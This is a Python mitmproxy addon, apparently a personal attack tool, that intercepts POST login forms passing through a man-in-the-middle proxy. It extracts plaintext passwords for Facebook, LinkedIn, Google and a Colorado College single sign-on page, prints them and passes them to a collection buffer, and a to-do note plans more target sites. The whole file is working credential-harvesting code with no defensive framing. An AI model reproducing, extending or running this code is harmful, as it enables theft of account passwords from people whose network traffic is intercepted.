import mitmproxy
from mitm_buffer import *

class Get_Pwords:
	'''
		TO DO:
			add more sites
	'''

	def __init__(self):
		self.interface = MITM_Interface()

	def get_facebook(self,form, flow):
		if form['pass'] and "facebook.com" in flow.request.headers[':authority']:
			print("account: Facebook, password:", form['pass'])
			return self.interface.read_traffic("facebook", form['pass'])
		else:
			pass
		
	def get_linkedin(self,form, flow):
		if "linkedin.com" in flow.request.headers['Host'] and form['session_password']:
			print("account: Linkedin, password:", form['session_password'])
			return self.interface.read_traffic("linkedin", form["session_password"])
		else:
			pass

	def get_google(self, form, flow):
		if "Passwd" in form and form['Page'] == "PasswordSeparationSignIn" and "google.com" in flow.request.headers[':authority']:
			print("account: Gmail, password:", form['Passwd'])
			return self.interface.read_traffic("google", form['Passwd'])
		else:
			pass

	def get_CC(self,form, flow):
		if flow.request.headers['Host'] == "cas.coloradocollege.edu" and form['password']: 
			print("account: CC SSI, password:", form['password'])
			return self.interface.read_traffic("cc_ssi", form['password'])
		else:
			pass

	def request(self,flow):
		if flow.request.urlencoded_form and flow.request.method == 'POST':
			form = flow.request.urlencoded_form
			try:
				self.get_google(form, flow)
			except KeyError as ke:
				print("error supressed: key not in urlencoded_form: ", ke)
				pass
			try:
				self.get_CC(form, flow)
			except KeyError as ke:
				print("error supressed: key not in urlencoded_form: ", ke)
				pass
			try:
				self.get_facebook(form, flow)
			except KeyError as ke:
				print("error supressed: key not in urlencoded_form: ", ke)
				pass
			try:
				self.get_linkedin(form, flow)
			except KeyError as ke:
				print("error supressed: key not in urlencoded_form: ", ke)
				pass
				

def start():
	return Get_Pwords()
